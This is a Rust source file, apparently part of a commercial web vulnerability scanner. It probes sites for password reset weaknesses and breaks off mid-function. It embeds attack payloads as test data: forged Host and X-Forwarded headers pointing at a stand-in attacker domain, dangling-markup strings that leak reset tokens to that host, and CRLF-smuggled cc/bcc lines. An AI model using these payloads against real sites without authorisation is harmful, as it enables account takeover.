// Copyright (c) 2026 Bountyy Oy. All rights reserved.
// This software is proprietary and confidential.

use crate::http_client::HttpClient;
use crate::types::{Confidence, ScanConfig, Severity, Vulnerability};
use anyhow::Result;
use regex::Regex;
use std::collections::HashSet;
use std::sync::Arc;
use std::time::Duration;
use tracing::{debug, info};

/// Password Reset Poisoning Scanner
pub struct PasswordResetPoisoningScanner {
    http_client: Arc<HttpClient>,
    /// Unique attacker domain for detection
    attacker_domain: String,
    /// Unique identifier for this scan instance
    scan_id: String,
}

/// Discovered password reset endpoint
#[derive(Debug, Clone)]
struct ResetEndpoint {
    url: String,
    method: String,
    endpoint_type: ResetEndpointType,
    email_param: String,
    additional_params: Vec<(String, String)>,
    is_api: bool,
}

/// Type of reset endpoint
#[derive(Debug, Clone, PartialEq)]
enum ResetEndpointType {
    ForgotPassword,
    ResetPassword,
    ChangePassword,
    AccountRecovery,
}

/// Token analysis result
#[derive(Debug)]
struct TokenAnalysis {
    token: String,
    length: usize,
    entropy_bits: f64,
    is_sequential: bool,
    is_timestamp_based: bool,
    charset: String,
}

impl PasswordResetPoisoningScanner {
    pub fn new(http_client: Arc<HttpClient>) -> Self {
        let scan_id = Self::generate_id();
        let attacker_domain = format!("prp-{}.attacker.test", scan_id);

        Self {
            http_client,
            attacker_domain,
            scan_id,
        }
    }

    /// Generate unique identifier
    fn generate_id() -> String {
        use rand::Rng;
        let mut rng = rand::rng();
        format!("{:08x}", rng.random::<u32>())
    }

    /// Main scan entry point
    pub async fn scan(
        &self,
        url: &str,
        _config: &ScanConfig,
    ) -> Result<(Vec<Vulnerability>, usize)> {
        // License check
        if !crate::license::verify_scan_authorized() {
            return Err(anyhow::anyhow!(
                "Scan not authorized. Please check your license."
            ));
        }

        info!("[PasswordResetPoisoning] Starting comprehensive password reset security scan");

        let mut all_vulnerabilities = Vec::new();
        let mut total_tests = 0;

        // Phase 1: Discover password reset endpoints
        total_tests += 1;
        let endpoints = self.discover_reset_endpoints(url).await;

        if endpoints.is_empty() {
            info!("[PasswordResetPoisoning] No password reset endpoints found - skipping");
            return Ok((Vec::new(), total_tests));
        }

        info!(
            "[PasswordResetPoisoning] Found {} password reset endpoints",
            endpoints.len()
        );

        // Phase 2: Test each endpoint
        for endpoint in &endpoints {
            // Test 1: Host header injection
            let (vulns, tests) = self.test_host_header_injection(endpoint).await;
            all_vulnerabilities.extend(vulns);
            total_tests += tests;

            // Test 2: X-Forwarded-* header injection
            let (vulns, tests) = self.test_forwarded_headers(endpoint).await;
            all_vulnerabilities.extend(vulns);
            total_tests += tests;

            // Test 3: Dangling markup injection
            let (vulns, tests) = self.test_dangling_markup(endpoint).await;
            all_vulnerabilities.extend(vulns);
            total_tests += tests;

            // Test 4: Email parameter manipulation
            let (vulns, tests) = self.test_email_manipulation(endpoint).await;
            all_vulnerabilities.extend(vulns);
            total_tests += tests;

            // Test 5: Token analysis (if we can trigger reset)
            let (vulns, tests) = self.test_token_security(endpoint).await;
            all_vulnerabilities.extend(vulns);
            total_tests += tests;

            // Test 6: Rate limiting
            let (vulns, tests) = self.test_rate_limiting(endpoint).await;
            all_vulnerabilities.extend(vulns);
            total_tests += tests;

            // Test 7: Username enumeration
            let (vulns, tests) = self.test_username_enumeration(endpoint).await;
            all_vulnerabilities.extend(vulns);
            total_tests += tests;

            // Test 8: Password change without old password (for change password endpoints)
            if endpoint.endpoint_type == ResetEndpointType::ChangePassword {
                let (vulns, tests) = self.test_password_change_security(endpoint).await;
                all_vulnerabilities.extend(vulns);
                total_tests += tests;
            }
        }

        info!(
            "[PasswordResetPoisoning] Completed {} tests, found {} vulnerabilities",
            total_tests,
            all_vulnerabilities.len()
        );

        Ok((all_vulnerabilities, total_tests))
    }

    /// Discover password reset endpoints
    async fn discover_reset_endpoints(&self, base_url: &str) -> Vec<ResetEndpoint> {
        let mut endpoints = Vec::new();
        let mut discovered_urls = HashSet::new();

        // Common password reset paths
        let reset_paths = vec![
            // Forgot password
            ("/forgot-password", ResetEndpointType::ForgotPassword),
            ("/forgot_password", ResetEndpointType::ForgotPassword),
            ("/forgotpassword", ResetEndpointType::ForgotPassword),
            ("/password/forgot", ResetEndpointType::ForgotPassword),
            ("/password-forgot", ResetEndpointType::ForgotPassword),
            ("/account/forgot", ResetEndpointType::ForgotPassword),
            ("/users/password/new", ResetEndpointType::ForgotPassword),
            ("/auth/forgot", ResetEndpointType::ForgotPassword),
            ("/auth/forgot-password", ResetEndpointType::ForgotPassword),
            // API endpoints
            ("/api/auth/forgot", ResetEndpointType::ForgotPassword),
            (
                "/api/auth/forgot-password",
                ResetEndpointType::ForgotPassword,
            ),
            ("/api/password/forgot", ResetEndpointType::ForgotPassword),
            ("/api/v1/auth/forgot", ResetEndpointType::ForgotPassword),
            ("/api/v1/password/forgot", ResetEndpointType::ForgotPassword),
            ("/api/v1/forgot-password", ResetEndpointType::ForgotPassword),
            (
                "/api/users/forgot-password",
                ResetEndpointType::ForgotPassword,
            ),
            // Reset password
            ("/reset-password", ResetEndpointType::ResetPassword),
            ("/reset_password", ResetEndpointType::ResetPassword),
            ("/resetpassword", ResetEndpointType::ResetPassword),
            ("/password/reset", ResetEndpointType::ResetPassword),
            ("/password-reset", ResetEndpointType::ResetPassword),
            ("/account/reset", ResetEndpointType::ResetPassword),
            ("/auth/reset", ResetEndpointType::ResetPassword),
            ("/api/auth/reset", ResetEndpointType::ResetPassword),
            ("/api/password/reset", ResetEndpointType::ResetPassword),
            // Change password
            ("/change-password", ResetEndpointType::ChangePassword),
            ("/change_password", ResetEndpointType::ChangePassword),
            ("/password/change", ResetEndpointType::ChangePassword),
            ("/account/password", ResetEndpointType::ChangePassword),
            ("/settings/password", ResetEndpointType::ChangePassword),
            ("/api/password/change", ResetEndpointType::ChangePassword),
            // Account recovery
            ("/recover", ResetEndpointType::AccountRecovery),
            ("/recovery", ResetEndpointType::AccountRecovery),
            ("/account/recover", ResetEndpointType::AccountRecovery),
            ("/account/recovery", ResetEndpointType::AccountRecovery),
            ("/api/account/recover", ResetEndpointType::AccountRecovery),
        ];

        let base = base_url.trim_end_matches('/');

        // Test each path
        for (path, endpoint_type) in &reset_paths {
            let test_url = format!("{}{}", base, path);

            if discovered_urls.contains(&test_url) {
                continue;
            }

            // Check if endpoint exists (GET first to find forms)
            match self.http_client.get(&test_url).await {
                Ok(response) => {
                    // Check for valid response (not 404, etc.)
                    if response.status_code == 200 || response.status_code == 302 {
                        let body_lower = response.body.to_lowercase();

                        // Look for password reset indicators
                        let is_reset_page = body_lower.contains("email")
                            || body_lower.contains("password")
                            || body_lower.contains("reset")
                            || body_lower.contains("forgot")
                            || body_lower.contains("recover");

                        if is_reset_page {
                            // Try to extract email parameter name
                            let email_param = self.detect_email_param(&response.body);
                            let is_api = path.contains("/api/");

                            discovered_urls.insert(test_url.clone());
                            endpoints.push(ResetEndpoint {
                                url: test_url,
                                method: "POST".to_string(),
                                endpoint_type: endpoint_type.clone(),
                                email_param,
                                additional_params: Vec::new(),
                                is_api,
                            });
                        }
                    }
                }
                Err(_) => continue,
            }
        }

        // Also check main page for forms
        if let Ok(response) = self.http_client.get(base_url).await {
            self.extract_reset_forms(
                &response.body,
                base_url,
                &mut endpoints,
                &mut discovered_urls,
            );
        }

        endpoints
    }

    /// Detect email parameter name from HTML
    fn detect_email_param(&self, html: &str) -> String {
        let html_lower = html.to_lowercase();

        // Common patterns for email input
        let patterns = [
            r#"name=["']?email["']?"#,
            r#"name=["']?user_email["']?"#,
            r#"name=["']?userEmail["']?"#,
            r#"name=["']?username["']?"#,
            r#"name=["']?login["']?"#,
            r#"name=["']?user["']?"#,
            r#"name=["']?account["']?"#,
        ];

        for pattern in &patterns {
            if let Ok(re) = Regex::new(pattern) {
                if re.is_match(&html_lower) {
                    // Extract the actual parameter name
                    if pattern.contains("email") {
                        return "email".to_string();
                    } else if pattern.contains("username") {
                        return "username".to_string();
                    } else if pattern.contains("user_email") {
                        return "user_email".to_string();
                    } else if pattern.contains("userEmail") {
                        return "userEmail".to_string();
                    }
                }
            }
        }

        // Default to email
        "email".to_string()
    }

    /// Extract reset forms from HTML
    fn extract_reset_forms(
        &self,
        html: &str,
        base_url: &str,
        endpoints: &mut Vec<ResetEndpoint>,
        discovered_urls: &mut HashSet<String>,
    ) {
        let html_lower = html.to_lowercase();

        // Look for forms with password reset indicators
        let form_pattern =
            Regex::new(r#"<form[^>]*action=["']([^"']+)["'][^>]*>([\s\S]*?)</form>"#);

        if let Ok(re) = form_pattern {
            for cap in re.captures_iter(&html_lower) {
                let action = cap.get(1).map(|m| m.as_str()).unwrap_or("");
                let form_content = cap.get(2).map(|m| m.as_str()).unwrap_or("");

                // Check if this is a password reset form
                let is_reset = form_content.contains("forgot")
                    || form_content.contains("reset")
                    || form_content.contains("recover")
                    || action.contains("forgot")
                    || action.contains("reset")
                    || action.contains("recover");

                let has_email = form_content.contains("email")
                    || form_content.contains("type=\"email\"")
                    || form_content.contains("type='email'");

                if is_reset && has_email {
                    let full_url = self.resolve_url(action, base_url);

                    if !discovered_urls.contains(&full_url) {
                        discovered_urls.insert(full_url.clone());

                        let endpoint_type = if action.contains("forgot") {
                            ResetEndpointType::ForgotPassword
                        } else if action.contains("change") {
                            ResetEndpointType::ChangePassword
                        } else {
                            ResetEndpointType::ResetPassword
                        };

                        endpoints.push(ResetEndpoint {
                            url: full_url,
                            method: "POST".to_string(),
                            endpoint_type,
                            email_param: self.detect_email_param(form_content),
                            additional_params: Vec::new(),
                            is_api: false,
                        });
                    }
                }
            }
        }
    }

    /// Test Host header injection
    async fn test_host_header_injection(
        &self,
        endpoint: &ResetEndpoint,
    ) -> (Vec<Vulnerability>, usize) {
        let mut vulnerabilities = Vec::new();
        let mut tests_run = 0;

        debug!("Testing Host header injection on {}", endpoint.url);

        // Payloads for Host header injection
        let host_payloads = vec![
            (self.attacker_domain.clone(), "direct_injection"),
            (format!("{}:443", self.attacker_domain), "port_manipulation"),
            (
                format!("{}:80@legitimate.com", self.attacker_domain),
                "at_sign_bypass",
            ),
        ];

        let test_email = "prp-test@bountyy-scanner.invalid";

        for (host_value, technique) in &host_payloads {
            tests_run += 1;

            let body = if endpoint.is_api {
                format!(r#"{{"{}":"{}"}}"#, endpoint.email_param, test_email)
            } else {
                format!(
                    "{}={}",
                    endpoint.email_param,
                    urlencoding::encode(test_email)
                )
            };

            let content_type = if endpoint.is_api {
                "application/json"
            } else {
                "application/x-www-form-urlencoded"
            };

            let headers = vec![
                ("Host".to_string(), host_value.clone()),
                ("Content-Type".to_string(), content_type.to_string()),
            ];

            match self
                .http_client
                .post_with_headers(&endpoint.url, &body, headers)
                .await
            {
                Ok(response) => {
                    // Check if attacker domain appears in response
                    if response.body.contains(&self.attacker_domain) {
                        info!(
                            "[PasswordResetPoisoning] Host header injection detected via {}",
                            technique
                        );
                        vulnerabilities.push(self.create_vulnerability(
                            &endpoint.url,
                            &format!("Host: {}", host_value),
                            technique,
                            "Password Reset Poisoning via Host Header",
                            Severity::High,
                            Confidence::High,
                            &format!(
                                "Attacker-controlled domain '{}' reflected in password reset response. \
                                Reset emails will contain links to attacker's server.",
                                self.attacker_domain
                            ),
                            "CWE-640",
                            8.1,
                        ));
                        break; // One confirmed finding is enough
                    }

                    // Check response headers for reflection
                    if let Some(location) = response.headers.get("location") {
                        if location.contains(&self.attacker_domain) {
                            vulnerabilities.push(self.create_vulnerability(
                                &endpoint.url,
                                &format!("Host: {}", host_value),
                                technique,
                                "Password Reset Redirect Poisoning",
                                Severity::High,
                                Confidence::High,
                                &format!(
                                    "Password reset redirects to attacker domain: {}",
                                    location
                                ),
                                "CWE-640",
                                8.1,
                            ));
                        }
                    }
                }
                Err(e) => {
                    debug!("Request failed: {}", e);
                }
            }
        }

        (vulnerabilities, tests_run)
    }

    /// Test X-Forwarded-* header injection
    async fn test_forwarded_headers(
        &self,
        endpoint: &ResetEndpoint,
    ) -> (Vec<Vulnerability>, usize) {
        let mut vulnerabilities = Vec::new();
        let mut tests_run = 0;

        debug!("Testing X-Forwarded-* headers on {}", endpoint.url);

        let forwarded_headers = vec![
            ("X-Forwarded-Host", "x_forwarded_host"),
            ("X-Host", "x_host"),
            ("X-Forwarded-Server", "x_forwarded_server"),
            ("X-HTTP-Host-Override", "x_http_host_override"),
            ("X-Original-URL", "x_original_url"),
            ("X-Rewrite-URL", "x_rewrite_url"),
            ("Forwarded", "forwarded_rfc7239"),
        ];

        let test_email = "prp-xfh-test@bountyy-scanner.invalid";

        for (header_name, technique) in &forwarded_headers {
            tests_run += 1;

            let header_value = if *header_name == "Forwarded" {
                format!("host={}", self.attacker_domain)
            } else if *header_name == "X-Original-URL" || *header_name == "X-Rewrite-URL" {
                format!("http://{}/reset", self.attacker_domain)
            } else {
                self.attacker_domain.clone()
            };

            let body = if endpoint.is_api {
                format!(r#"{{"{}":"{}"}}"#, endpoint.email_param, test_email)
            } else {
                format!(
                    "{}={}",
                    endpoint.email_param,
                    urlencoding::encode(test_email)
                )
            };

            let content_type = if endpoint.is_api {
                "application/json"
            } else {
                "application/x-www-form-urlencoded"
            };

            let headers = vec![
                (header_name.to_string(), header_value.clone()),
                ("Content-Type".to_string(), content_type.to_string()),
            ];

            match self
                .http_client
                .post_with_headers(&endpoint.url, &body, headers)
                .await
            {
                Ok(response) => {
                    if response.body.contains(&self.attacker_domain) {
                        info!(
                            "[PasswordResetPoisoning] {} injection detected",
                            header_name
                        );
                        vulnerabilities.push(self.create_vulnerability(
                            &endpoint.url,
                            &format!("{}: {}", header_name, header_value),
                            technique,
                            &format!("Password Reset Poisoning via {}", header_name),
                            Severity::High,
                            Confidence::High,
                            &format!(
                                "Password reset uses {} header value for link generation. \
                                Attacker can intercept reset tokens by sending reset request \
                                with malicious {} header.",
                                header_name, header_name
                            ),
                            "CWE-640",
                            8.1,
                        ));
                        break;
                    }

                    // Check for 200 response with success indicators (potential vulnerability)
                    if response.status_code == 200 {
                        let body_lower = response.body.to_lowercase();
                        if body_lower.contains("email sent")
                            || body_lower.contains("reset link")
                            || body_lower.contains("check your email")
                        {
                            // Could be vulnerable but needs OOB verification
                            vulnerabilities.push(self.create_vulnerability(
                                &endpoint.url,
                                &format!("{}: {}", header_name, header_value),
                                technique,
                                &format!("Potential Password Reset Poisoning via {}", header_name),
                                Severity::Medium,
                                Confidence::Low,
                                &format!(
                                    "Password reset endpoint accepts {} header. \
                                    Verify with out-of-band detection if reset links use this header.",
                                    header_name
                                ),
                                "CWE-640",
                                6.5,
                            ));
                        }
                    }
                }
                Err(e) => {
                    debug!("Request failed: {}", e);
                }
            }
        }

        (vulnerabilities, tests_run)
    }

    /// Test dangling markup injection
    async fn test_dangling_markup(&self, endpoint: &ResetEndpoint) -> (Vec<Vulnerability>, usize) {
        let mut vulnerabilities = Vec::new();
        let mut tests_run = 0;

        debug!("Testing dangling markup injection on {}", endpoint.url);

        // Dangling markup payloads to capture token
        let dangling_payloads = vec![
            (
                format!(
                    "victim@example.com<img src=\"http://{}/capture?token=",
                    self.attacker_domain
                ),
                "img_src_dangling",
            ),
            (
                format!(
                    "victim@example.com'><img src=http://{}/",
                    self.attacker_domain
                ),
                "attr_escape_img",
            ),
            (
                format!(
                    "victim@example.com\"><a href=\"http://{}/",
                    self.attacker_domain
                ),
                "attr_escape_anchor",
            ),
            (
                format!(
                    "victim@example.com<base href=\"http://{}/\">",
                    self.attacker_domain
                ),
                "base_tag_injection",
            ),
            (
                format!(
                    "victim@example.com<style>@import url('http://{}/",
                    self.attacker_domain
                ),
                "css_import_dangling",
            ),
        ];

        for (payload, technique) in &dangling_payloads {
            tests_run += 1;

            let body = if endpoint.is_api {
                format!(
                    r#"{{"{}":"{}"}}"#,
                    endpoint.email_param,
                    payload.replace('"', "\\\"")
                )
            } else {
                format!("{}={}", endpoint.email_param, urlencoding::encode(payload))
            };

            let content_type = if endpoint.is_api {
                "application/json"
            } else {
                "application/x-www-form-urlencoded"
            };

            let headers = vec![("Content-Type".to_string(), content_type.to_string())];

            match self
                .http_client
                .post_with_headers(&endpoint.url, &body, headers)
                .await
            {
                Ok(response) => {
                    // Check if our payload appears in response (reflected)
                    if response.body.contains(&self.attacker_domain) {
                        info!(
                            "[PasswordResetPoisoning] Dangling markup injection detected via {}",
                            technique
                        );
                        vulnerabilities.push(self.create_vulnerability(
                            &endpoint.url,
                            payload,
                            technique,
                            "Dangling Markup Injection in Password Reset",
                            Severity::High,
                            Confidence::High,
                            &format!(
                                "Email parameter vulnerable to dangling markup injection. \
                                Attacker can inject HTML that captures the reset token. \
                                Technique: {}",
                                technique
                            ),
                            "CWE-74",
                            8.5,
                        ));
                        break;
                    }

                    // Check for success response (email might be sent with injected markup)
                    if response.status_code == 200 {
                        let body_lower = response.body.to_lowercase();
                        let accepted = body_lower.contains("email sent")
                            || body_lower.contains("reset link")
                            || body_lower.contains("check your email");

                        let rejected = body_lower.contains("invalid email")
                            || body_lower.contains("error")
                            || body_lower.contains("invalid format");

                        if accepted && !rejected {
                            vulnerabilities.push(self.create_vulnerability(
                                &endpoint.url,
                                payload,
                                technique,
                                "Potential Dangling Markup in Password Reset Email",
                                Severity::Medium,
                                Confidence::Low,
                                "Password reset accepted email with dangling markup. \
                                If HTML is rendered in email, token could be exfiltrated.",
                                "CWE-74",
                                6.5,
                            ));
                        }
                    }
                }
                Err(e) => {
                    debug!("Request failed: {}", e);
                }
            }
        }

        (vulnerabilities, tests_run)
    }

    /// Test email parameter manipulation
    async fn test_email_manipulation(
        &self,
        endpoint: &ResetEndpoint,
    ) -> (Vec<Vulnerability>, usize) {
        let mut vulnerabilities = Vec::new();
        let mut tests_run = 0;

        debug!("Testing email parameter manipulation on {}", endpoint.url);

        let victim_email = "victim@example.com";
        let attacker_email = "attacker@evil.test";

        // Email manipulation payloads
        let manipulation_payloads = vec![
            // Array parameter injection
            (
                format!(
                    "{}[]={}&{}[]={}",
                    endpoint.email_param, victim_email, endpoint.email_param, attacker_email
                ),
                "array_injection",
                "Array parameter injection - both emails may receive reset link",
            ),
            // Carbon copy injection
            (
                format!(
                    "{}={}%0acc:{}",
                    endpoint.email_param, victim_email, attacker_email
                ),
                "cc_injection_lf",
                "CC header injection via LF - attacker gets copy of reset email",
            ),
            (
                format!(
                    "{}={}%0d%0acc:{}",
                    endpoint.email_param, victim_email, attacker_email
                ),
                "cc_injection_crlf",
                "CC header injection via CRLF",
            ),
            (
                format!(
                    "{}={}%0abcc:{}",
                    endpoint.email_param, victim_email, attacker_email
                ),
                "bcc_injection",
                "BCC header injection - attacker gets hidden copy",
            ),
            // Separator injection
            (
                format!(
                    "{}={},{}",
                    endpoint.email_param, victim_email, attacker_email
                ),
                "comma_separator",
                "Comma-separated emails - both may receive reset",
            ),
            (
                format!(
                    "{}={};{}",
                    endpoint.email_param, victim_email, attacker_email
                ),
                "semicolon_separator",
                "Semicolon-separated emails",
            ),
            (
                format!(
                    "{}={} {}",
                    endpoint.email_param, victim_email, attacker_email
                ),
                "space_separator",
                "Space-separated emails",
            ),
            // JSON array (for API endpoints)
            (
                format!(
                    r#"{{"{}":["{}", "{}"]}}"#,
                    endpoint.email_param, victim_email, attacker_email
                ),
                "json_array",
                "JSON array of emails",
            ),
        ];

        for (payload, technique, description) in &manipulation_payloads {
            tests_run += 1;

            // Skip JSON payloads for non-API endpoints and vice versa
            if technique == &"json_array" && !endpoint.is_api {
                continue;
            }
            if technique != &"json_array" && endpoint.is_api {
                // Convert to JSON format
                continue;
            }

            let (body, content_type) = if endpoint.is_api && technique == &"json_array" {
                (payload.clone(), "application/json")
            } else if !endpoint.is_api && technique != &"json_array" {
                (payload.clone(), "application/x-www-form-urlencoded")
            } else {
                continue;
            };

            let headers = vec![("Content-Type".to_string(), content_type.to_string())];

            match self
                .http_client
                .post_with_headers(&endpoint.url, &body, headers)
                .await
            {
                Ok(response) => {
                    let body_lower = response.body.to_lowercase();

                    // Check for success indicators - require password-reset-specific phrases
                    let accepted = response.status_code == 200
                        && (body_lower.contains("email sent")
                            || body_lower.contains("reset link")
                            || body_lower.contains("check your email")
                            || body_lower.contains("password reset email")
                            || body_lower.contains("\"success\":true"));

                    // Check for explicit rejection - use specific phrases, not bare "invalid"/"error"
                    let rejected = body_lower.contains("invalid email")
                        || body_lower.contains("email not found")
                        || body_lower.contains("\"error\":")
                        || body_lower.contains("only one email")
                        || body_lower.contains("multiple emails");

                    if accepted && !rejected {
                        info!(
                            "[PasswordResetPoisoning] Email manipulation accepted via {}",
                            technique
                        );
                        vulnerabilities.push(self.create_vulnerability(
                            &endpoint.url,
                            payload,
                            technique,
                            "Email Parameter Manipulation in Password Reset",
                            Severity::High,
                            Confidence::Medium,
                            description,
                            "CWE-74",
                            7.5,
                        ));
                    }

                    // Check for reflected attacker email
                    if response.body.contains(attacker_email) {
                        vulnerabilities.push(self.create_vulnerability(
                            &endpoint.url,
                            payload,
                            technique,
                            "Attacker Email Reflected in Password Reset",
                            Severity::Medium,
                            Confidence::High,
                            "Attacker's email address appears in response, suggesting it may be processed.",
                            "CWE-74",
                            6.5,
                        ));
                    }
                }
                Err(e) => {
                    debug!("Request failed: {}", e);
                }
            }
        }

        (vulnerabilities, tests_run)
    }

    /// Test token security
    async fn test_token_security(&self, endpoint: &ResetEndpoint) -> (Vec<Vulnerability>, usize) {
        let mut vulnerabilities = Vec::new();
        let mut tests_run = 0;

        debug!("Testing token security on {}", endpoint.url);

        // Only test forgot password endpoints (they generate tokens)
        if endpoint.endpoint_type != ResetEndpointType::ForgotPassword {
            return (vulnerabilities, tests_run);
        }

        // Send multiple reset requests to analyze tokens
        let mut tokens: Vec<TokenAnalysis> = Vec::new();

        for i in 0..3 {
            tests_run += 1;

            let test_email = format!("prp-token-test-{}@bountyy-scanner.invalid", i);

            let body = if endpoint.is_api {
                format!(r#"{{"{}":"{}"}}"#, endpoint.email_param, test_email)
            } else {
                format!(
                    "{}={}",
                    endpoint.email_param,
                    urlencoding::encode(&test_email)
                )
            };

            let content_type = if endpoint.is_api {
                "application/json"
            } else {
                "application/x-www-form-urlencoded"
            };

            let headers = vec![("Content-Type".to_string(), content_type.to_string())];

            match self
                .http_client
                .post_with_headers(&endpoint.url, &body, headers)
                .await
            {
                Ok(response) => {
                    // Try to extract token from response
                    if let Some(token) = self.extract_token(&response.body) {
                        tokens.push(self.analyze_token(&token));
                    }
                }
                Err(e) => {
                    debug!("Request failed: {}", e);
                }
            }

            // Small delay between requests
            tokio::time::sleep(Duration::from_millis(100)).await;
        }

        // Analyze collected tokens
        if !tokens.is_empty() {
            // Check entropy
            let avg_entropy: f64 =
                tokens.iter().map(|t| t.entropy_bits).sum::<f64>() / tokens.len() as f64;

            if avg_entropy < 128.0 {
                vulnerabilities.push(self.create_vulnerability(
                    &endpoint.url,
                    &format!("Average entropy: {:.1} bits", avg_entropy),
                    "low_entropy_token",
                    "Weak Password Reset Token (Low Entropy)",
                    if avg_entropy < 64.0 {
                        Severity::Critical
                    } else {
                        Severity::High
                    },
                    Confidence::High,
                    &format!(
                        "Password reset tokens have insufficient entropy ({:.1} bits). \
                        Tokens should have at least 128 bits of entropy. \
                        This makes tokens predictable and vulnerable to brute-force attacks.",
                        avg_entropy
                    ),
                    "CWE-640",
                    if avg_entropy < 64.0 { 9.0 } else { 8.0 },
                ));
            }

            // Check for sequential tokens
            let sequential_count = tokens.iter().filter(|t| t.is_sequential).count();
            if sequential_count > 0 {
                vulnerabilities.push(self.create_vulnerability(
                    &endpoint.url,
                    "Sequential pattern detected in tokens",
                    "sequential_token",
                    "Predictable Password Reset Token (Sequential)",
                    Severity::Critical,
                    Confidence::High,
                    "Password reset tokens appear to be sequential or incrementing. \
                    Attacker can predict future tokens based on observed values.",
                    "CWE-640",
                    9.0,
                ));
            }

            // Check for timestamp-based tokens
            let timestamp_count = tokens.iter().filter(|t| t.is_timestamp_based).count();
            if timestamp_count > 0 {
                vulnerabilities.push(self.create_vulnerability(
                    &endpoint.url,
                    "Timestamp pattern detected in tokens",
                    "timestamp_token",
                    "Predictable Password Reset Token (Timestamp-Based)",
                    Severity::High,
                    Confidence::Medium,
                    "Password reset tokens appear to include timestamp data. \
                    Attacker with approximate time knowledge can reduce brute-force space.",
                    "CWE-640",
                    7.5,
                ));
            }

            // Check token length
            let avg_length: usize = tokens.iter().map(|t| t.length).sum::<usize>() / tokens.len();
            if avg_length < 20 {
                vulnerabilities.push(self.create_vulnerability(
                    &endpoint.url,
                    &format!("Average token length: {} characters", avg_length),
                    "short_token",
                    "Short Password Reset Token",
                    Severity::Medium,
                    Confidence::High,
                    &format!(
                        "Password reset tokens are only {} characters long. \
                        Recommend using at least 32 characters with full alphanumeric charset.",
                        avg_length
                    ),
                    "CWE-640",
                    6.5,
                ));
            }
        }

        (vulnerabilities, tests_run)
    }

    /// Extract token from response
    fn extract_token(&self, body: &str) -> Option<String> {
        // Common token patterns in responses
        let token_patterns = vec![
            r#"token["\s:=]+["']?([a-zA-Z0-9_-]{8,})["']?"#,
            r#"reset[_-]?token["\s:=]+["']?([a-zA-Z0-9_-]{8,})["']?"#,
            r#"code["\s:=]+["']?([a-zA-Z0-9_-]{6,})["']?"#,
            r#"/reset[/\-]?password[/?][a-zA-Z0-9_=-]+[&?]token=([a-zA-Z0-9_-]+)"#,
            r#"/reset/([a-zA-Z0-9_-]{20,})"#,
        ];

        for pattern in &token_patterns {
            if let Ok(re) = Regex::new(pattern) {
                if let Some(cap) = re.captures(body) {
                    if let Some(token) = cap.get(1) {
                        return Some(token.as_str().to_string());
                    }
                }
            }
        }

        None
    }

    /// Analyze token properties
    fn analyze_token(&self, token: &str) -> TokenAnalysis {
        let length = token.len();

        // Determine charset
        let has_upper = token.chars().any(|c| c.is_ascii_uppercase());
        let has_lower = token.chars().any(|c| c.is_ascii_lowercase());
        let has_digit = token.chars().any(|c| c.is_ascii_digit());
        let has_special = token.chars().any(|c| !c.is_alphanumeric());

        let charset_size: f64 = if has_special {
            94.0 // Full ASCII printable
        } else if has_upper && has_lower && has_digit {
            62.0 // Alphanumeric
        } else if (has_upper || has_lower) && has_digit {
            36.0 // Case-insensitive alphanumeric
        } else if has_digit {
            10.0 // Numeric only
        } else {
            26.0 // Letters only
        };

        let charset = if has_special {
            "full_ascii".to_string()
        } else if has_upper && has_lower {
            "alphanumeric_mixed".to_string()
        } else if has_digit {
            "alphanumeric_lower".to_string()
        } else {
            "alphabetic".to_string()
        };

        // Calculate entropy
        let entropy_bits = length as f64 * charset_size.log2();

        // Check for sequential pattern
        let is_sequential = self.check_sequential(token);

        // Check for timestamp
        let is_timestamp_based = self.check_timestamp(token);

        TokenAnalysis {
            token: token.to_string(),
            length,
            entropy_bits,
            is_sequential,
            is_timestamp_based,
            charset,
        }
    }

    /// Check if token appears sequential
    fn check_sequential(&self, token: &str) -> bool {
        // Check if token is purely numeric and could be sequential
        if token.chars().all(|c| c.is_ascii_digit()) {
            return true;
        }

        // Check for incrementing pattern
        let chars: Vec<char> = token.chars().collect();
        if chars.len() > 3 {
            let mut incrementing = 0;
            for i in 1..chars.len() {
                if chars[i] as u32 == chars[i - 1] as u32 + 1 {
                    incrementing += 1;
                }
            }
            if incrementing > chars.len() / 2 {
                return true;
            }
        }

        false
    }

    /// Check if token contains timestamp
    fn check_timestamp(&self, token: &str) -> bool {
        // Check for Unix timestamp pattern (10-13 digits)
        let timestamp_pattern = Regex::new(r"[0-9]{10,13}").unwrap();
        if timestamp_pattern.is_match(token) {
            // Verify it's in reasonable timestamp range
            if let Some(cap) = timestamp_pattern.captures(token) {
                if let Some(ts) = cap.get(0) {
                    if let Ok(timestamp) = ts.as_str()[..10].parse::<u64>() {
                        // Check if it's within 10 years of current time
                        let now = std::time::SystemTime::now()
                            .duration_since(std::time::UNIX_EPOCH)
                            .map(|d| d.as_secs())
                            .unwrap_or(0);

                        if timestamp > now.saturating_sub(315360000)
                            && timestamp < now.saturating_add(315360000)
                        {
                            return true;
                        }
                    }
                }
            }
        }

        false
    }

    /// Test rate limiting on reset endpoint
    async fn test_rate_limiting(&self, endpoint: &ResetEndpoint) -> (Vec<Vulnerability>, usize) {
        let mut vulnerabilities = Vec::new();
        let tests_run = 5;

        debug!("Testing rate limiting on {}", endpoint.url);

        let mut successful_requests = 0;
        let mut rate_limited = false;

        for i in 0..tests_run {
            let test_email = format!("prp-ratelimit-{}@bountyy-scanner.invalid", i);

            let body = if endpoint.is_api {
                format!(r#"{{"{}":"{}"}}"#, endpoint.email_param, test_email)
            } else {
                format!(
                    "{}={}",
                    endpoint.email_param,
                    urlencoding::encode(&test_email)
                )
            };

            let content_type = if endpoint.is_api {
                "application/json"
            } else {
                "application/x-www-form-urlencoded"
            };

            let headers = vec![("Content-Type".to_string(), content_type.to_string())];

            match self
                .http_client
                .post_with_headers(&endpoint.url, &body, headers)
                .await
            {
                Ok(response) => {
                    if response.status_code == 429
                        || response.body.to_lowercase().contains("rate limit")
                        || response.body.to_lowercase().contains("too many")
                        || response.body.to_lowercase().contains("slow down")
                    {
                        rate_limited = true;
                        break;
                    }

                    if response.status_code == 200 || response.status_code == 201 {
                        successful_requests += 1;
                    }
                }
                Err(_) => {}
            }

            tokio::time::sleep(Duration::from_millis(50)).await;
        }

        if !rate_limited && successful_requests >= 3 {
            vulnerabilities.push(self.create_vulnerability(
                &endpoint.url,
                &format!(
                    "{} requests sent, {} successful, no rate limiting",
                    tests_run, successful_requests
                ),
                "no_rate_limiting",
                "Missing Rate Limiting on Password Reset",
                Severity::Medium,
                Confidence::High,
                "Password reset endpoint lacks rate limiting. \
                This allows attackers to:\n\
                - Flood users with reset emails (email bombing)\n\
                - Attempt token brute-force attacks\n\
                - Enumerate valid email addresses",
                "CWE-307",
                5.3,
            ));
        }

